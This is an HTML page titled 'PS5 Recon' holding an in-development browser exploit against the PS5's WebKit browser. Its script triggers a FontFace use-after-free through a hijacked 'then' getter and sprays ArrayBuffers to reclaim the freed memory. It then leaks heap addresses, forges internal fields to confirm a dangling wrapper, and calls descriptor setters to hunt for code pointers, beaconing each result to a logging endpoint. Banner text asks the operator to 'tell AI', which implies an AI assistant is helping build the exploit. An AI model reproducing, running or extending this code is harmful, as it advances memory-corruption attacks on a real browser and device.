<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>PS5 Recon</title>
<style>
:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 17px/1.3 ui-monospace,monospace;padding:15px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
#sub{position:fixed;top:68px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
#log{margin:100px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:74vh;overflow:auto}
.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
.r.warn .t{color:var(--amber)}
.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
</style></head>
<body>
<div id="bn">starting…</div>
<div id="sub">P1317 — dangling lf1: descriptor SETTERS write engine pointers into our buffer (addrOf + code-ptr hunt)</div>
<div id="log"></div>
<script>
'use strict';
window.PTAG='P1317';
var LOG=document.getElementById('log'),BN=document.getElementById('bn');
var _ctr=0;
function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
function cls(s){var z=(''+s).toLowerCase();
  if(/win|code-ptr|addrof|controlled|new-ptr/.test(z))return 'win';
  if(/hit|ok\b|dangling-ok|loaded/.test(z))return 'ok';
  if(/err|fail|crash|fatal|miss|nospray|cap|no-w|not-dangle/.test(z))return 'bad';
  if(/stale|none|retry/.test(z))return 'warn';return '';}
function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
  LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
function B(tag,data){
  var c=cls(tag+' '+(data||''));row(tag,data,c);
  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
    var u='/beacon.php?tag=P1317-'+encodeURIComponent(tag);
    if(data)u+='&data='+encodeURIComponent(s);
    u+='&t='+Date.now();
    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
}
window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};

(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();

function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}

var leaked={L1:null,L2:null,buf:null,W:null};
window.__lf=null;

var RC=0;try{RC=parseInt(sessionStorage.getItem('p1317_rc')||'0',10)||0;}catch(e){}
function reloadOnce(why){
  if(leaked.ok)return;
  if(RC>=4){B('CAP',why+' — 4 tries, CLOSE+REOPEN');S('capped — close+reopen the browser','#4a2a12');return;}
  try{sessionStorage.setItem('p1317_rc',String(RC+1));}catch(e){}
  setTimeout(function(){location.reload();},400);
}

/* ═══ STAGE 1 — proven leak + capture lf1, REQUIRE it be the dangling wrapper ═══ */
var K=32,SIZE=192,fired=false;
S('STAGE 1 — proven leak + lf1…','#13233a');
window.__sp=[];
var fs=null;
try{
  var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(vf); void vf.loaded;
  fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
}catch(e){B('S1-SETUP-ERR',(''+e).slice(0,50));}
Object.defineProperty(FontFace.prototype,'then',{configurable:true,
  get:function(){
    if(fired)return undefined;fired=true;
    try{if(fs){fs.textContent='';fs.remove();}}catch(e){}
    try{document.fonts.delete(this);}catch(e){}
    fs=null;
    try{document.body.offsetHeight;}catch(e){}
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
B('S1-SETUP','armed');
try{
  document.fonts.load('1em vf, v1','AB').then(
    function(faces){window.__lf=faces;B('S1-RES','n'+(faces&&faces.length));setTimeout(leScan,80);},
    function(e){B('S1-RJ',''+(e&&e.name));setTimeout(leScan,80);});
}catch(e){B('S1-LOADERR',(''+e).slice(0,40));}
setTimeout(function(){ if(leaked.ok)return; if(!window.__sp||!window.__sp.length){B('S1-NOSPRAY','getter never fired');reloadOnce('nospray');} },1500);
setTimeout(function(){ if(!leaked.buf){leScan();} },700);

function leScan(){
  if(leaked.buf)return;
  var sp=window.__sp||[],hit=-1;
  for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){leaked.L1=a;leaked.L2=le(sp[i],0x68);leaked.buf=sp[i];hit=i;break;}}
  if(hit<0){B('S1-MISS','no reclaim');reloadOnce('miss');return;}
  B('S1-HIT','L1=0x'+leaked.L1.toString(16)+' L2=0x'+leaked.L2.toString(16)+' k'+hit);
  /* find WHICH captured wrapper is backed by our buffer (forge m_status=4 -> status 'error') */
  var W=null,which='';
  var cands=[];
  if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(['lf'+i,window.__lf[i]]);
  leaked.buf[0x82]=4;
  for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i][1].status;}catch(e){st='ERR';}if(st==='error'){W=cands[i][1];which=cands[i][0];break;}}
  leaked.buf[0x82]=3;
  if(!W){B('NOT-DANGLE','no captured wrapper backed by our buffer this run');S('not dangling this run — reloading…','#4a2a12');reloadOnce('notdangle');return;}
  leaked.W=W;leaked.ok=true;
  B('DANGLING-OK','wrapper='+which+' backed by our buffer');
  S('DANGLING '+which+' — descriptor-setter hunt…','#0c7a3a');
  setTimeout(escalate,150);
}

/* ═══ STAGE 2 — descriptor setters write engine pointers into our buffer ═══ */
function classify(off,v){
  if(v===0n)return null;
  if(v>=0x1000000000n&&v<0x9000000000n)return 'heap';
  if(v<0x100000n)return 'small';
  if(v>=0xffffff00000000n)return 'sentinel';
  return 'CODE?';
}
function dumpAll(label){
  var buf=leaked.buf,parts=[];
  for(var off=0;off<0xC0;off+=8){
    var v=le(buf,off);var c=classify(off,v);
    if(c&&!(off===0&&c==='CODE?'))parts.push('0x'+off.toString(16)+'=0x'+v.toString(16)+'['+c+']');
    if(c==='CODE?'&&off!==0){B('CODE-PTR','WIN '+label+' @0x'+off.toString(16)+' = 0x'+le(buf,off).toString(16)+' — NON-HEAP pointer (module/.text candidate!)');S('CODE POINTER LEAKED !!! tell AI','#0a7a2a');}
  }
  B('DUMP-'+label,parts.join(' '));
}
function setD(name,val){
  try{leaked.W[name]=val;var rb='';try{rb=''+leaked.W[name];}catch(e){rb='?';}B('SET-'+name,'ok rb='+rb.slice(0,24));}
  catch(e){B('SET-'+name+'-ERR',(''+(e&&e.message||e)).slice(0,50));}
}
function escalate(){
  if(window.__e)return;window.__e=true;
  var buf=leaked.buf;
  dumpAll('PRE');
  /* neutralize m_clients (0x58..0x67) so setters' client-notify can't crash before we read */
  for(var i=0x58;i<0x68;i++)buf[i]=0;
  B('NEUTRALIZE','m_clients zeroed');

  /* unicodeRange writes m_ranges(0x20) -> engine array whose (from,to) WE control */
  setD('unicodeRange','U+1234-5678');
  dumpAll('POST-ur');
  B('UR-FIELDS','ranges.buf@0x20=0x'+le(buf,0x20).toString(16)+' cap/size@0x28=0x'+le(buf,0x28).toString(16));

  /* the rest go via mutableProperties() (0x08) — may write member ptrs or throw */
  setD('weight','700'); dumpAll('POST-weight');
  setD('style','italic'); dumpAll('POST-style');
  setD('featureSettings','"liga" 1'); dumpAll('POST-feat');
  setD('display','swap'); dumpAll('POST-display');

  setTimeout(finish,200);
}
function finish(){
  if(window.__fin)return;window.__fin=true;
  B('DONE','p1317');
  S('P1317 COMPLETE — press the run button, I\'ll aggregate','#1b2330');
}
</script>
</body></html>
